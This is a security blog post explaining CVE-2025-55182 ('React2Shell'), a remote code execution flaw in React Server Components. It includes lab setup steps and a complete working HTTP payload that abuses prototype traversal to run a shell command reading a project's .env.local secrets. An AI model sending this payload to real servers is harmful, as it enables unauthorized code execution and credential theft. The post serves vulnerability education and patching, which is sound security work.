# **Understanding CVE-2025-55182 (React2Shell): A Deep Dive into Remote Code Execution via React Server Components**

## **Overview**

CVE-2025-55182, also known as **React2Shell**, is a **critical remote code execution (RCE)** vulnerability affecting **React Server Components**. This flaw enables unauthenticated attackers to execute arbitrary code on vulnerable servers by exploiting an **unsafe deserialization** issue in React’s **Flight protocol**.

Given its **CVSS score of 10.0**, this vulnerability is highly severe and requires immediate attention. In this post, I’ll walk you through the vulnerability’s details, the exploit mechanism, and provide a **proof-of-concept (PoC)** demonstration. Let’s dive in.

## **Affected Versions**

The following versions of **React Server Components** and related packages are vulnerable:

- **React Server Components**: 19.0.0, 19.1.0, 19.1.1, 19.2.0
    
- **Affected Packages**:
    
    - react-server-dom-parcel
        
    - react-server-dom-turbopack
        
    - react-server-dom-webpack
        

### **What is React and React Server Components?**

**React.js** is one of the most popular JavaScript libraries for building **user interfaces**, especially in the context of **single-page applications (SPAs)**. It enables developers to create dynamic and interactive user experiences.

**React Server Components (RSC)** is an experimental feature that allows some parts of a React app to be rendered on the **server**, rather than the client. This reduces the amount of JavaScript required on the client-side and improves performance, particularly in large applications.

However, RSC introduces new complexities, particularly in how data is exchanged between the server and the client. **CVE-2025-55182** exploits one such issue with the **Flight protocol**, which is used in RSC to transfer data between the server and client.

---

## **The Vulnerability**

### **Vulnerability Summary**

CVE-2025-55182 stems from **unsafe deserialization** in React’s **Flight protocol**. Deserialization is the process of converting serialized data (usually JSON) into an object in memory. React uses this process to handle data exchanged between the server and the client during server-side rendering.

However, React's deserialization implementation is unsafe. Specifically, React uses **bracket notation** to access properties of objects (e.g., `moduleExports[metadata[2]]`), which allows attackers to manipulate the **prototype chain** of JavaScript objects. This results in **prototype pollution** and opens up the ability to modify the properties of objects in unexpected ways, allowing attackers to exploit the deserialization logic.

### **Root Cause**

The root of the vulnerability lies in how React handles Flight protocol payloads. The use of **bracket notation** for property access allows attackers to traverse the **prototype chain**, granting them access to properties that shouldn’t normally be accessible—such as **constructor**. By manipulating this property, attackers can access the global **Function constructor** and execute arbitrary JavaScript code on the server.

### **How the Exploit Works**

The exploit works by sending a specially crafted payload to the server, which manipulates the Flight protocol’s deserialization logic. By combining **prototype pollution** and unsafe deserialization, an attacker can gain control of the server and execute arbitrary code.

Key components of the attack include:

1. **Prototype Pollution**: The attacker manipulates an object’s prototype chain to inject new properties, including the **constructor** and **Function** properties.
    
2. **Payload Execution**: Once the attacker has access to the **Function** constructor, they can execute arbitrary JavaScript code, such as reading files or executing system commands.
    

---

## **Step-by-Step Exploitation**

### **Setting Up the Vulnerable Environment**

To test the exploit, you’ll need a vulnerable React environment. Here’s how to set it up:

1. **Create a Vulnerable Project**  
    First, create a new Next.js project with a vulnerable version of React Server Components:
    

- `npx create-next-app@16.0.6 poc-react2shell cd poc-react2shell`
    
    Alternatively, you can use a pre-configured **GitHub repository** that already contains the vulnerable setup.
    
- **Create a Test Environment File**  
    In your project’s root directory, create a `.env.local` file containing sensitive data, like API keys. The attacker will target this file in the PoC:
    

- `SECRET_API_KEY=XXXXXXXXXXXXXXXXXXXXXXXXXXXXX`
    
- **Start the Development Server**  
    Run the development server:
    

1. `npm run dev`
    
    The vulnerable server should now be running on **[http://localhost:3000](http://localhost:3000)**.
    

---

### **Exploitation Steps**

Once your environment is ready, you can send the malicious payload to trigger the exploit. This is where **Burp Suite** or any other HTTP proxy tool comes in handy.

1. **Send the Malicious Payload**  
    Open Burp Suite and navigate to the **Repeater** tab. Set the target URL to **[http://localhost:3000/](http://localhost:3000/)** and send the following malicious payload:
    

2. ``POST / HTTP/1.1 Host: localhost:3000 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0 Next-Action: x X-Nextjs-Request-Id: b5dce965 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad Content-Length: 752  ------WebKitFormBoundaryx8jO2oVc6SWP3Sad Content-Disposition: form-data; name="0" {   "then": "$1:__proto__:then",   "status": "resolved_model",   "reason": -1,   "value": "{\"then\":\"$B1337\"}",   "_response": {     "_prefix": "var res=process.mainModule.require('child_process').execSync('cat .env.local',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",     "_chunks": "$Q2",     "_formData": {       "get": "$1:constructor:constructor"     }   } } ------WebKitFormBoundaryx8jO2oVc6SWP3Sad``
    
3. **Analyze the Response**  
    After sending the request, if the exploit succeeds, the server will respond with the contents of your `.env.local` file (or any sensitive data in the environment variables). This confirms the attacker’s access to confidential data.

![[poc.png]]
---

### **Explaining the Malicious Payload**

#### **Headers Breakdown**

1. **Host**: Specifies the target server (localhost:3000).
    
2. **User-Agent**: Identifies the client making the request. The string is typically from a browser, but here it may be crafted to obfuscate the attack.
    
3. **Next-Action**: Likely part of Next.js's processing, it might confuse the server or interact with the deserialization process.
    
4. **X-Nextjs-Request-Id**: Unique request ID for tracking and debugging in Next.js.
    
5. **Content-Type**: Multipart form data, used for structured data like JSON or file uploads.
    
6. **Content-Length**: Indicates the length of the request body.
    

#### **Multipart Fields**

- **Field 0**: Contains the payload that triggers **prototype pollution**. It modifies the object’s prototype, adds a new **then** property, and includes a malicious `_response` object. The `_prefix` runs a **child_process** command to read the `.env.local` file.
    
- **Field 1**: References **Field 0** to propagate the attack.
    
- **Field 2**: Empty array, ensuring the payload’s structure remains intact.
    

---

## **Impact of the Vulnerability**

The CVE-2025-55182 vulnerability enables attackers to:

1. **Execute arbitrary code** on the server.
    
2. **Read sensitive files**, such as **API keys** and **configuration files**.
    
3. **Establish reverse shells**, potentially gaining full control of the server.
    
4. **Exfiltrate sensitive data** from the server.
    

---

## **Conclusion**

CVE-2025-55182 (React2Shell) is a critical vulnerability in React Server Components that allows unauthenticated attackers to execute arbitrary code on vulnerable servers. By exploiting unsafe deserialization and prototype pollution, attackers can gain full control over the server, read sensitive data, and execute malicious commands.

**If you're using React Server Components**, it’s crucial to update to the latest patched versions to mitigate this vulnerability. Adhering to **best security practices**, such as input validation and proper deserialization handling, is essential for preventing similar vulnerabilities.


## References
-----
- [CVE-2025-55182 Details](https://www.cyberhub.blog/cves/CVE-2025-55182)
- [Next.js-RSC-RCE-Scanner-CVE-2025-66478](https://github.com/Malayke/Next.js-RSC-RCE-Scanner-CVE-2025-66478)
- [PoC [kOaDT]](github.com/kOaDT/poc-cve-2025-55182/)
- [react2shellcve202555182](https://tryhackme.com/room/react2shellcve202555182)

## Disclaimer


This proof of concept is intended solely for educational and research purposes. **Do not attempt to exploit or test vulnerabilities on any system without explicit, written consent** from the system owner. Unauthorized testing may be illegal and unethical. Always adhere to legal and responsible practices in cybersecurity.
